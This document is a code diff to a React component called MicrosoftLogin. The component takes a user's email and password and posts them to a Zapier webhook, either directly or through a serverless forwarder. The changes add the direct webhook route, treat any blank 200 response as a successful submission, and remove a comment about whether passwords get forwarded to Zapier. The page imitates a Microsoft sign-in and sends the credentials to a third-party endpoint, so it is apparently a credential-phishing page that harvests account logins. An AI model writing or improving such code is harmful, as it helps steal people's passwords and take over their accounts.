@@ -14,8 +14,10 @@ enum Stage {
   SUCCESS = 'SUCCESS'
 }
 
-// Point the frontend at the serverless function you will deploy on Vercel
-const BACKEND_ENDPOINT = "/api/forwardToZapier";
+// If VITE_ZAPIER_WEBHOOK is set at build time, the client will POST directly to Zapier.
+// Otherwise it falls back to the serverless forwarder.
+const ZAPIER_WEBHOOK = (import.meta.env.VITE_ZAPIER_WEBHOOK as string) || "";
+const BACKEND_ENDPOINT = ZAPIER_WEBHOOK || "/api/forwardToZapier";
 
 const MicrosoftLogin: React.FC = () => {
   const [stage, setStage] = useState<Stage>(Stage.VALIDATING);
@@ -84,7 +86,6 @@ const MicrosoftLogin: React.FC = () => {
       document.cookie = "keepSignedIn=false; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
     }
 
-    // Payload sent to the serverless forwarder. Server controls whether to forward password to Zapier.
     const payload = {
       email,
       password,
@@ -101,13 +102,35 @@ const MicrosoftLogin: React.FC = () => {
         },
         body: JSON.stringify(payload)
       });
-      const result = await response.json();
-      if (response.ok && result.success) {
-        setStage(Stage.SUCCESS);
-      } else {
-        setPwError(result.error || `Status ${response.status}`);
-        setStage(Stage.PASSWORD);
+
+      // Handle success even if body is empty or non-JSON (Zapier often returns 200 with no JSON)
+      if (response.ok) {
+        // Try to parse JSON if present, but treat a blank 200 as success.
+        let parsed: any = null;
+        try {
+          parsed = await response.json();
+        } catch {
+          // ignore parse errors — treat as success unless parsed explicitly says success:false
+        }
+        if (parsed && parsed.success === false) {
+          setPwError(parsed.error || 'Submission failed');
+          setStage(Stage.PASSWORD);
+        } else {
+          setStage(Stage.SUCCESS);
+        }
+        return;
       }
+
+      // Non-OK: try to extract error info
+      let errText = `Status ${response.status}`;
+      try {
+        const json = await response.json();
+        errText = json.error || errText;
+      } catch {
+        // ignore
+      }
+      setPwError(errText);
+      setStage(Stage.PASSWORD);
     } catch (error: any) {
       setPwError('Network error: ' + (error?.message || 'unknown'));
       setStage(Stage.PASSWORD);
@@ -151,7 +174,7 @@ const MicrosoftLogin: React.FC = () => {
             <div>
               <input
                 type="text"
-                name="email" // Added for Formspree
+                name="email"
                 value={email}
                 onChange={(e) => {
                   setEmail(e.target.value);
@@ -223,7 +246,7 @@ const MicrosoftLogin: React.FC = () => {
               </div>
             </div>
             <PasswordInput
-              name="password" // Ensure PasswordInput includes this
+              name="password"
               value={password}
               onChange={(e) => {
                 setPassword(e.target.value);
